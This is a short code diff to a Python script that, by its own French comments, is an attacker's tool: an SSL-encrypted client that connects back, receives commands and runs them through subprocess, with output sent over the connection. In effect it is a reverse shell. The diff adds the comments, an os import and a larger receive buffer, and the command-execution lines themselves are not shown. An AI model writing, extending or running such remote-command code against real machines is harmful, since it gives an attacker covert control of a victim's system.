@@ -1,6 +1,12 @@
+# import des librairies suivantes :
+# socket = communication entre l'attaquant et la cible
+# ssl = chiffrement des échanges
+# subprocess = exécution des commandes
+# os = manipulation des commandes de l'OS
 import socket
 import ssl
 import subprocess
+import os
 
 # Create a TCP/IP socket
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -15,7 +21,7 @@ wrappedSocket.connect(('localhost', 1234))
 
 try:
    while True:
-        received_data = wrappedSocket.recv(1024)
+        received_data = wrappedSocket.recv(4096)
         # Send the output of the command over the SSL connection
         # Execute a system command
 
